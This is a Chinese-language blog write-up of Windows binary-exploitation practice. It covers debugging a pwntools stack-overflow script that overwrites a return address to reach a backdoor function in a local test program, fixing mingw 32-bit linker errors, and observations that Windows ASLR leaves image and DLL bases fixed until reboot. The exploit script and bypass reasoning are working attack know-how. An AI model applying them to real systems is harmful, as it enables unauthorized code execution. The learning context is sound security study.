<p>本次调试的目的是为了探究 <code>exp</code> 没有打通的原因，猜测是偏移量的计算可能出了问题。这个位置已经是 <code>gets</code> 读入了数据，那么应该关注寄存器和栈的状态。在红框的部分中分别标注了 <code>ebp</code> <code>esp</code> 寄存器的值以及栈区。<code>0x61616161</code> 是垃圾数据 <code>a</code> ，而 <code>ebp</code> 寄存器是 <code>0x0061FF28</code> ，在执行 <code>leave</code> 指令（相当于 <code>mov esp,ebp</code> <code>pop ebp</code> 两条指令）后，<code>esp</code> 会处于当前 <code>ebp</code> 下面一个内存单元的位置，并用 <code>ret</code> 指令跳转该内存单元中的地址。再观察栈区，发现 <code>ebp</code> 的位置并没有被垃圾数据所覆盖，而是在 <code>0x61FF24</code> 处就截止了。因此正确覆盖返回地址的偏移量应该在原本的基础上加 <code>8</code></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202403092017695.png" alt="image-20240309201739605"></p>
<p>修改 <code>exp</code> 后，再进行调试</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">12345</span>)</span><br><span class="line">pause()</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x10</span>+<span class="number">0x4</span>+<span class="number">0x8</span>)</span><br><span class="line">payload += p32(<span class="number">0x00401410</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<p>此时可以看到 <code>main</code> 函数的返回地址已经被修改成 <code>0x401410</code></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202403092030677.png" alt="image-20240309203000473"></p>
<p>执行完 <code>ret</code> 指令后，执行流已经跳转到后门函数的起始地址 <code>0x401410</code></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202403092031053.png" alt="image-20240309203118990"></p>
<p>退出调试，让程序运行完毕，发现已经拿到了 <code>shell</code> 并且执行 <code>calc</code> 命令弹出了计算器。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202403092032979.png" alt="image-20240309203237597"></p>
<h2 id="报错解决"><a href="#报错解决" class="headerlink" title="报错解决"></a>报错解决</h2><h3 id="windows下gcc编译32位程序报错"><a href="#windows下gcc编译32位程序报错" class="headerlink" title="windows下gcc编译32位程序报错"></a>windows下gcc编译32位程序报错</h3><p>在 <code>windows</code> 中编译 <code>32</code> 位的程序，会出现如下报错（编译 <code>64</code> 位的程序正常）。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PS C:\Users\86137\Desktop&gt; gcc -m32 test.c -o test1.exe</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: skipping incompatible D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/lib/libmingw32.a when searching for -lmingw32</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: skipping incompatible D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/lib\libmingw32.a when searching for -lmingw32</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: skipping incompatible D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/lib/libmingw32.a when searching for -lmingw32</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: cannot find -lmingw32</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: skipping incompatible D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/libgcc.a when searching for -lgcc</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: skipping incompatible D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0\libgcc.a when searching for -lgcc</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: skipping incompatible D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/libgcc.a when searching for -lgcc</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: cannot find -lgcc</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: skipping incompatible D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/libgcc_eh.a when searching for -lgcc_eh</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: skipping incompatible D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0\libgcc_eh.a when searching for -lgcc_eh</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: skipping incompatible D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/libgcc_eh.a when searching for -lgcc_eh</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: cannot find -lgcc_eh</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: skipping incompatible D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/lib/libmoldname.a when searching for -lmoldname</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: skipping incompatible D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/lib\libmoldname.a when searching for -lmoldname</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: skipping incompatible D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/lib/libmoldname.a when searching for -lmoldname</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: cannot find -lmoldname</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: skipping incompatible D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/lib/libmingwex.a when searching for -lmingwex</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: skipping incompatible D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/lib\libmingwex.a when searching for -lmingwex</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: skipping incompatible D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/lib/libmingwex.a when searching for -lmingwex</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: cannot find -lmingwex</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: skipping incompatible D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/lib/libmsvcrt.a when searching for -lmsvcrt</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: skipping incompatible D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/lib\libmsvcrt.a when searching for -lmsvcrt</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: skipping incompatible D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/lib/libmsvcrt.a when searching for -lmsvcrt</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: cannot find -lmsvcrt</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: skipping incompatible D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/lib/libpthread.dll.a when searching for -lpthread</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: skipping incompatible D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/lib/libpthread.a when searching for -lpthread</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: skipping incompatible D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/lib\libpthread.a when searching for -lpthread</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: skipping incompatible D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/lib/libpthread.dll.a when searching for -lpthread</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: skipping incompatible D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/lib/libpthread.a when searching for -lpthread</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: cannot find -lpthread</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: skipping incompatible D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/lib/libadvapi32.a when searching for -ladvapi32</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: skipping incompatible D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/lib\libadvapi32.a when searching for -ladvapi32</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: skipping incompatible D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/lib/libadvapi32.a when searching for -ladvapi32</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: cannot find -ladvapi32</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: skipping incompatible D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/lib/libshell32.a when searching for -lshell32</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: skipping incompatible D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/lib\libshell32.a when searching for -lshell32</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: skipping incompatible D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/lib/libshell32.a when searching for -lshell32</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: cannot find -lshell32</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: skipping incompatible D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/lib/libuser32.a when searching for -luser32</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: skipping incompatible D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/lib\libuser32.a when searching for -luser32</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: skipping incompatible D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/lib/libuser32.a when searching for -luser32</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: cannot find -luser32</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: skipping incompatible D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/lib/libkernel32.a when searching for -lkernel32</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: skipping incompatible D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/lib\libkernel32.a when searching for -lkernel32</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: skipping incompatible D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/lib/libkernel32.a when searching for -lkernel32</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: cannot find -lkernel32</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: skipping incompatible D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/lib/libiconv.a when searching for -liconv</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: skipping incompatible D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/lib\libiconv.a when searching for -liconv</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: skipping incompatible D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/lib/libiconv.a when searching for -liconv</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: cannot find -liconv</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: skipping incompatible D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/lib/libmingw32.a when searching for -lmingw32</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: skipping incompatible D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/lib\libmingw32.a when searching for -lmingw32</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: skipping incompatible D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/lib/libmingw32.a when searching for -lmingw32</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: cannot find -lmingw32</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: skipping incompatible D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/libgcc.a when searching for -lgcc</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: skipping incompatible D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0\libgcc.a when searching for -lgcc</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: skipping incompatible D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/libgcc.a when searching for -lgcc</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: cannot find -lgcc</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: skipping incompatible D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/libgcc_eh.a when searching for -lgcc_eh</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: skipping incompatible D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0\libgcc_eh.a when searching for -lgcc_eh</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: skipping incompatible D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/libgcc_eh.a when searching for -lgcc_eh</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: cannot find -lgcc_eh</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: skipping incompatible D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/lib/libmoldname.a when searching for -lmoldname</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: skipping incompatible D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/lib\libmoldname.a when searching for -lmoldname</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: skipping incompatible D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/lib/libmoldname.a when searching for -lmoldname</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: cannot find -lmoldname</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: skipping incompatible D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/lib/libmingwex.a when searching for -lmingwex</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: skipping incompatible D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/lib\libmingwex.a when searching for -lmingwex</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: skipping incompatible D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/lib/libmingwex.a when searching for -lmingwex</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: cannot find -lmingwex</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: skipping incompatible D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/lib/libmsvcrt.a when searching for -lmsvcrt</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: skipping incompatible D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/lib\libmsvcrt.a when searching for -lmsvcrt</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: skipping incompatible D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/lib/libmsvcrt.a when searching for -lmsvcrt</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: cannot find -lmsvcrt</span><br><span class="line">collect2.exe: error: ld returned 1 exit status</span><br></pre></td></tr></table></figure>

<p>报错解决参考这篇 <a target="_blank" rel="noopener" href="https://blog.csdn.net/chuanpeng0130/article/details/136382113">文章</a> ，大概原因是我原本下载的是 <code>mingw64</code> ，在编译 <code>32</code> 位程序的时候就会出问题，重新到官网上下载一个 <code>mingw</code> ，然后修改下环境变量就行了</p>
<p>PS：后来又发现没办法 <code>64</code> 位程序了，索性又下载了一个 <code>mingw64</code> ，然后将两个路径都导入了环境变量，<code>32</code> 位的命名为 <code>gcc.exe</code>  <code>64</code> 位的命名为 <code>gcc64.exe</code> ，这样就可以轻松切换两个 <code>gcc</code> 了。</p>
<h2 id="关于-Windows-下的-ASLR-机制"><a href="#关于-Windows-下的-ASLR-机制" class="headerlink" title="关于 Windows 下的 ASLR 机制"></a>关于 Windows 下的 ASLR 机制</h2><h3 id="起因：疑问的产生"><a href="#起因：疑问的产生" class="headerlink" title="起因：疑问的产生"></a>起因：疑问的产生</h3><p>关于 <code>Windows</code> 中 <code>ASLR</code> 的问题在我第一次做 <code>ret2dll</code> 的时候就注意到了，第一道 <code>ret2dll</code> 做的是这个 [题目](#root-me PE32 - Stack buffer overflow avancé) 。因为程序中没有 <code>system</code> 函数，需要去 <code>msvcrt.dll</code> 里获取。我用 <code>x32dbg</code> 看程序内存的时候发现 <code>system</code> 的地址一直没有改变，于是我就很纳闷，这泄露了个寂寞？当时我以为是 <code>ASLR</code> 没有开启，于是就放过了这里。而且那题是打的本地，第二次做 <a href="#2024NKCTF_%E6%9D%A5%E7%AD%BE%E4%B8%AA%E5%88%B0">ret2dll</a> 时打了远程，我用格式化字符串泄露了远程的 <code>dll</code> 地址，发现还是固定的，不过因为 <code>checksec</code> 和 <code>x32dbg</code> 的插件 <code>checksec</code> 都没检测出来程序的 <code>ASLR</code> ，又放过了这个问题。</p>
<p>除去入门时自己写的例题 <code>ret2text</code> ，现在我做到了第三道题 <a href="#%E5%BC%BA%E7%BD%91%E6%9D%AF2020_easyoverflow">强网杯2020_easyoverflow</a>。这道题看了师傅们的 <code>wp</code> ，要泄露 <code>StackCookie</code> 的值（这个没什么解释的，正常操作），接着要泄露程序基地址。刚开始我觉得也很正常，因为这个题开了 <code>ASLR</code> ，程序的基地址会随机化。可是我在之后的调试过程中，我突然发现程序的基地址似乎一直没有改变…</p>
<h3 id="探索"><a href="#探索" class="headerlink" title="探索"></a>探索</h3><p>起初我以为是 <code>x32dbg</code> 类似于 <code>GDB</code> 可以在调试程序时自动关闭进程的地址随机化，于是后来我先运行程序，而后附加进程调试，查看了程序基地址依然没有改变。而后我开始怀疑是不是程序的问题，我尝试自己去编写一个开启 <code>ASLR</code> 保护的程序</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span>* heap = (<span class="type">char</span>*)<span class="built_in">malloc</span>(<span class="number">100</span>);</span><br><span class="line">    <span class="type">char</span> <span class="built_in">stack</span>[<span class="number">100</span>];</span><br><span class="line">    system(<span class="string">&quot;whoami&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Address of heap:0x%p\nAddress of stack 0x%p\nAddress of main 0x%p\nAddress of system 0x%p\n&quot;</span>, heap, <span class="built_in">stack</span>, main, &amp;system);</span><br><span class="line">    getchar();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>刚开始直接用的 <code>gcc</code> ，但是 <code>ASLR</code> 一直开不起来</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240325233320278.png" alt="image-20240325233320278"></p>
<p>导致程序的各类地址都是固定的</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240325233216490.png" alt="image-20240325233216490"></p>
<p>后来测试的时候，发现在 <code>Visual Studio</code> 中编译的程序是开启了 <code>ASLR</code> 保护的</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240325233716030.png" alt="image-20240325233716030"></p>
<p>再运行程序，查看打印的地址，发现只有堆地址和栈地址是随机的，而程序基地址（观察 <code>main</code> 函数）和 <code>dll</code> 模块加载地址（观察 <code>system</code> 库函数）依旧是固定值。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240325234108163.png" alt="image-20240325234108163"></p>
<p>此时我开始怀疑自己没搞明白 <code>windows</code> 下的 <code>ASLR</code> 机制到底是怎么一回事，然后经过漫长的搜索后，我发现了这些文章对我解决疑问很有帮助。</p>
<p><a target="_blank" rel="noopener" href="https://book.crifan.com/books/explore_underlying_mechanism_binary_security/website/windows/security_mechanism/alsr.html">ASLR · 探究底层机制：二进制安全 (crifan.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://czxvan.github.io/2023/10/22/Windwos-PWN/ASLR-in-Windows/">ASLR in Windows | czxvan’s blog</a></p>
<p><a target="_blank" rel="noopener" href="https://introspelliam.github.io/2017/07/14/0day/%E5%86%85%E5%AD%98%E9%9A%8F%E6%9C%BA%E5%8C%96%E4%BF%9D%E6%8A%A4-ASLR-%E7%AE%80%E4%BB%8B/">内存随机化保护(ASLR)简介 | Introspelliam</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.morphisec.com/aslr-what-it-is-and-what-it-isnt/">ASLR - What It Is, and What It Isn’t (morphisec.com)</a></p>
<p>经过阅读上面的四篇文章，结合自己上面的代码测试，能够让我有八成的把握坚信自己的想法是正确的–在 <code>windows</code> 中 <code>ASLR</code> 开启后只有堆、栈的区域是随机的，而程序基地址和模块基地址都是在重启系统时随机的，之后每次运行程序都是固定的。</p>
<p>但因为最开始做 <code>Linux</code> 下的 <code>pwn</code> 题比较多，<code>ASLR+PIE</code> 开满时，所有的地址在每次程序重新运行时都是随机的。相比较 <code>windows</code> 下的地址随机化，这让我一度不敢坚信自己的猜测。这意味着在本地分析程序时，我可以用调试器直接拿到程序或模块的基地址而无需泄露，甚至我可以花一段时间爆破出固定的地址，让随机化看起来形同虚设。</p>
<p>还有一个原因让我不确定，因为关于这个地址随机化的问题，之前看师傅们的文章中似乎并没有提及。</p>
<p>抱着请教的心态给 <a target="_blank" rel="noopener" href="https://ret2ver.github.io/">Vergissmeinnicht</a> 师傅发了一封邮件，在得到 <strong>Vergissmeinnicht</strong> 师傅肯定的答复后，我确定了上面的猜测（再次感谢 <strong>Vergissmeinnicht</strong> 师傅）</p>
<h3 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h3><p>后来我思索了一下，大概是这样的。</p>
